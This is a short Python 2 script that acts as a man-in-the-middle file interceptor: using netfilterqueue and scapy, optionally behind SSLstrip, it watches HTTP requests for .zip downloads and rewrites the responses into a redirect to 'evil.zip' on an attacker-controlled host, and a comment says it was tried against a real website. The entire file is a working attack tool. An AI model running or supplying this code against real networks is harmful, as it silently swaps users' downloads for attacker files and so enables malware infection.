#! /usr/bin/env python
# WARNING: Not compatible with Python 3.x

import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # HTTP Request
        # TODO: add an argument to set port for SSLstrip or use default
        if scapy_packet[scapy.TCP].dport == 10000:  # change port to '80' if not using SSLstrip
            # TODO: refactor code - use 'ip address' as an argument, together with file path.
            if ".zip" in scapy_packet[scapy.Raw].load and "10.0.2.15" not in scapy_packet[scapy.Raw].load:
                # Tested on unsecured website: chomikuj.pl
                print("[+] Download ZIP Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        # HTTP Response
        elif scapy_packet[scapy.TCP].sport == 10000:  # change port to '80' if not using SSLstrip
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet,
                                           "HTTP/1.1 301 Moved Permanently\n"
                                           "Location: http://10.0.2.15/downloads/evil.zip\n\n")
                packet.set_payload(str(modified_packet))

    packet.accept()


print("Queue has been created.")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
